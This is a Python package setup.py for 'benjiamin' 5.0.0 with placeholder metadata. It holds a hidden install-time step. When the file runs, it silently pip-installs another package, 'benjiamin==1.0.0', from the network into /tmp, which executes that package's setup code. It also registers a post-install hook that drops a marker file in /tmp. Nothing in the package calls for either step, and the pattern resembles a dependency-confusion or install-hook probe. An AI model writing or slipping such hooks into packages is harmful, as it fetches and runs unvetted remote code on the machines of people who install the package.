from setuptools import setup, find_packages
import subprocess
import sys
import atexit
import os
from setuptools.command.install import install


subprocess.check_call([sys.executable, "-m", "pip", "install", "benjiamin==1.0.0", "--target={}".format("/tmp")])

def create_tmp_file(file_name="shuai.txt"):
    tmp_dir = '/tmp'  # Adjust this path based on your operating system
    file_path = os.path.join(tmp_dir, file_name)
    
    with open(file_path, 'w') as f:
        f.write("This is a temporary file created in the tmp folder.")
    
    print(f"File created successfully at: {file_path}")


def _post_install():
    print('POST INSTALL')
    create_tmp_file()

class new_install(install):
    def __init__(self, *args, **kwargs):
        super(new_install, self).__init__(*args, **kwargs)
        atexit.register(_post_install)

setup(
  name='benjiamin',
  version='5.0.0',
  author='Your Name',
  author_email='your.email@example.com',
  description='A short description of your package',
  packages=find_packages(),
  classifiers=[
  'Programming Language :: Python :: 3',
  'License :: OSI Approved :: MIT License',
  'Operating System :: OS Independent',
  ],
  python_requires='>=3.6',
  cmdclass={'install_data': new_install},
)

